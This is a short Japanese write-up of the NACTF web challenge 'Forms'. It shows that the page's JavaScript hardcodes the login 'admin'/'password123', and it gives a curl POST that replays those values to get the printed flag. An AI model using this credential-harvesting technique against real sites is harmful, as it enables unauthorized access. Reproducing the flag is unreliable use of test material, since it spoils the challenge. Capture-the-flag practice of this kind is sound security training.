# Forms:Web:125pts
Skywalker has created 1000 login forms and only managed to make one of them work. Find the right one and login! He also went a bit crazy with the colors for some reason.  
[https://forms.challenges.nactf.com/](https://forms.challenges.nactf.com/)  

# Solution
URLにアクセスすると、1000個のフォームがある。  
Forms  
[site.png](site/site.png)  
wgetしてソースコードを見ると以下の記述がある。  
```html
~~~
    <script type="text/javascript">
    function verify() {
        user = document.getElementById("username").value;
        pass = document.getElementById("password").value;
        if (user === "admin" && pass === "password123") {
            document.getElementById("submit").value = "correct_login";
        } else {
            document.getElementById("submit").value = "false";
        }
        document.form.submit();
    }
</script>
</body>
</html>
```
正解のフォームのみsubmitが`correct_login`となる(idで検索して、正解のフォームを使用してもよい)。  
usernameが`admin`、passwordが`password123`でありsubmitに`correct_login`が入ったものをPOSTする。  
```bash
$ curl -X POST -d "username=admin&password=password123&submit=correct_login" https://forms.challenges.nactf.com/ | grep nactf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0                Flag: nactf{cl13n75_ar3_3v11}
100  612k    0  612k  100    56   400k     36  0:00:01  0:00:01 --:--:--  400k
```
flagが得られた。  

## nactf{cl13n75_ar3_3v11}